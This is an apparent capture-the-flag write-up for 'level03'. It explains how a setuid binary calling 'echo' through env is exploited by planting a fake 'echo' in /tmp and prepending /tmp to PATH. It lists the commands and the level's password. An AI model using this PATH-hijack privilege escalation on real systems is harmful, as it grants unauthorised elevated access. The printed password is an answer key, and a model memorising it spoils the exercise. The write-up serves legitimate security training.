# LEVEL 03

## 💡 Explanation

In this level we have to:
1. When running the file level03 we get 'Exploit me'.
2. We check the permissions of the file level03: `ls -la level03` => `-rwsr-sr-x 1 flag03  level03 8.5K Mar  5  2016 level03`:
    - The file's owner is the user 'flag03' (permissions `rws` => read, write, and setuid : execute as the user).
    - The file's group is 'level03' (permissions `r-s` => read, and setgid : execute as the group).
3. We see that it executes `/usr/bin/env echo Exploit me`.
4. We modify the command `echo` to make it run `getflag` with the flag03 user permissions.
5. Last but not least, we just have permissions to create a file in /tmp so we have to do it there.

## 👾 Commands

```
./level03
strings level03 | grep "bin"
which getflag
echo '/bin/getflag' > /tmp/echo
chmod +x /tmp/echo
export PATH=/tmp:$PATH
./level03
```

## 🔍 Resources

- [Linux strings command](https://www.javatpoint.com/linux-strings-command#:~:text=Linux%20strings%20command%20is%20used,text%20from%20an%20executable%20file.)
- [Linux ls command](https://linuxize.com/post/how-to-list-files-in-linux-using-the-ls-command/)
- [Linux File's Rights](https://tech.feub.net/2008/03/setuid-setgid-et-sticky-bit/#:~:text=Le%20principe%20du%20setgid%20est,'agit%20d'un%20r%C3%A9pertoire.)
- [Linux env command](https://www.computerhope.com/unix/uenv.htm#:~:text=env%20is%20a%20shell%20command,without%20modifying%20the%20current%20one.)

## 🔥 Password
`qi0maab88jeaj46qoumi7maus`
